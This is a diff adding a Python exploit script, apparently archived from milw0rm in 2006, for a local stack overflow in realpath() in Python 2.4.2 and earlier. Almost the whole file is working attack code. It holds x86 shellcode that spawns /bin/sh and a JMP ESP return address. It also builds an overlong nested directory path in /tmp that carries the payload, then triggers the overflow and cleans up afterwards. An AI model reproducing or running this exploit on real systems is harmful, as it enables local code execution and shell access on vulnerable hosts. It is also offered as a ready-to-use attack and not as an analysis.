@@ -1,0 +1,47 @@
+#!/usr/bin/python
+ 
+# gexp-python.py
+# 
+# Python <= 2.4.2 realpath() Local Stack Overflow
+# -----------------------------------------------
+# Against VA Space Randomization.
+#
+# Copyright (c) 2006 Gotfault Security
+#
+# Bug found and developed by: dx/vaxen (Gotfault Security),
+#			      posidron (Tripbit Research Group).
+# Enviroment:
+#
+# Kernel Version	 : 2.6.12.5-vs2.0
+# GCC Version		 : 4.0.3
+# Libc Version		 : 2.3.5
+#
+# Special greets goes to : posidron from tripbit.net
+#			   RFDSLabs, barros, izik,
+#			   Gotfault Security Community.
+#
+# Original Reference:
+# http://gotfault.net/research/exploit/gexp-python.py
+
+import os
+
+# JMP *%ESP @ linux-gate.so.1
+jmp    = "\x5f\xe7\xff\xff"
+
+shell  = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e"
+shell += "\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3"
+shell += "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
+shell += "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+
+os.chdir("/tmp")
+base = os.getcwd()
+dir = os.path.join("A"*250, "A"*250, "A"*250, "A"*250, "A"*42, jmp+shell)
+os.makedirs(dir)
+os.chdir(dir)
+
+os.system('> vuln.py; python vuln.py')
+os.remove("vuln.py")
+os.chdir(base)
+os.removedirs(dir)
+
+# milw0rm.com [2006-03-18]
